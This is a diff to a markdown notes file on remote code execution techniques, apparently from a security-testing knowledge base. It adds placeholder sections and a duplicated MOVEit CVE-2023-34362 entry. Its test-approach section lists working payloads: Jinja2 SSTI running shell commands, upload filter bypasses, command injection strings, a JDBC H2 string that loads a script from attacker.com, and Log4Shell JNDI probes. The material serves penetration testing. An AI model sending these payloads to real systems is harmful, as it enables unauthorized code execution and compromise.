@@ -1,5 +1,66 @@
 # RCE Techniques
 
+> Tracked CVEs and techniques for this class. Updated via daily `refresh-latest` pipeline.
+
+_Last updated: 2026-04-17 · Items: 1_
+
+---
+
+## What
+
+_Define the class, prerequisites, and typical finding shape. Fill with real content._
+_pending enrichment — baseline opener below_
+
+See items under ## Items for per-finding details.
+
+---
+
+## CVEs
+
+| CVE | Date | Title | CVSS | Status | Src |
+|---|---|---|---|---|---|
+| CVE-2023-34362 | 2026-04-17 | Patch Diffing Progress MOVEit Transfer RCE (CVE-2023-34362) | high | patched | [src](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362) |
+| cve-2023-34362 | 2026-04-17 | Patch Diffing Progress MOVEit Transfer RCE (CVE-2023-34362) | high | patched | [src](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362) |
+
+---
+
+## Probes
+
+_Grep, curl, nuclei probes for this class. Append as items arrive with real PoCs._
+_pending enrichment_
+
+---
+
+## PoCs
+
+_Public PoC links rolled up from items below._
+
+- **CVE-2023-34362** — [source](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362)
+
+---
+
+## Reproduction
+
+_Step-by-step repro steps per CVE. Populated as items arrive with enough detail._
+_pending enrichment_
+
+---
+
+## Defense
+
+_Patch guidance and detection rules. Populated from vendor advisories._
+_pending enrichment_
+
+---
+
+## References
+
+- [www.assetnote.io](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362)
+
+---
+
+## Items
+
 > Remote Code Execution — achieving arbitrary command execution on a target system through web application vulnerabilities.
 
 ## Surface
@@ -16,31 +77,40 @@
 ## Test Approach
 
 1. **SSTI detection** — inject math expressions that differ between reflection and eval:
+
    ```
    {{7*7}}  → 49 = SSTI
    ${7*7}   → 49 = EL/Freemarker
    <%= 7*7 %> → 49 = ERB
    ```
+
 2. **SSTI escalation** (Jinja2):
+
    ```
    {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
    ```
+
 3. **File upload — PHAR/JSP**:
    - Rename `.php` to `.php5`, `.phtml`, `.php%00.jpg`
    - Upload SVG with `<script>` or SSRF-triggering XXE
    - Try PHAR deserialization: `phar://upload/file.jpg/exploit`
 4. **JDBC H2 injection** — probe unauthenticated setup/validation endpoints:
+
    ```
    {"db": "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker.com/rce.sql'"}
    ```
+
 5. **Command injection** — probe shell-adjacent params:
+
    ```
    ?host=127.0.0.1;id
    ?filename=test$(id).txt
    ?cmd=127.0.0.1`id`
    ```
+
 6. **SSRF → internal RCE pivot** — use gopher:// to hit Redis `SLAVEOF`, or Memcached `set` for deserialization
 7. **Log4Shell** — probe all headers and params:
+
    ```
    ${jndi:ldap://collab.attacker.com/a}
    X-Api-Version: ${jndi:ldap://...}
@@ -108,6 +178,7 @@ filename="shell.php%00.jpg"
 ## 2026-04-17
 
 ### Patch Diffing Progress MOVEit Transfer RCE (CVE-2023-34362) — `CVE-2023-34362`
+
 - **Tags:** `#rce`
 - **Severity:** high · **Hunt:** 4/5 · **Score:** 14.0 · **Status:** patched · **Age:** 30d
 - **Sources:** [1](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362)
